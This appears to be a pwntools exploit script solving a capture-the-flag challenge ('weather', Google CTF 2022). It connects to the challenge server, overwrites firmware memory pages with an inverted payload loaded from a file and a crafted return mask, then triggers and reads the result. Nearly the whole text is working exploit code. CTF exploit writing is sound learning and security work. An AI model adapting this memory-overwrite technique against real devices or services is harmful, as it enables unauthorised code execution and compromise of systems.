from pwn import *
io = remote("weather.2022.ctfcompetition.com", 1337)
print(io.recvline())
print(io.recvline())

def overwrite(page, mask):
    io.sendline(b'w 111137 ' + str(5 + len(mask)).encode() +  b' ' + str(page).encode() + b' 165 90 165 90 ' + b' '.join([str(b).encode() for b in mask]))
    print(io.recvline())

payload = [0, 0]
data = open("payload.bin", "rb").read()
for b in data:
    payload.append(0xff & ~b)

ret_mask = [
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 165, 128,
]

overwrite(40, payload)
overwrite(3, ret_mask)
io.sendline(b'r 111137 64')

for _ in range(4):
    print(io.recv(timeout=2))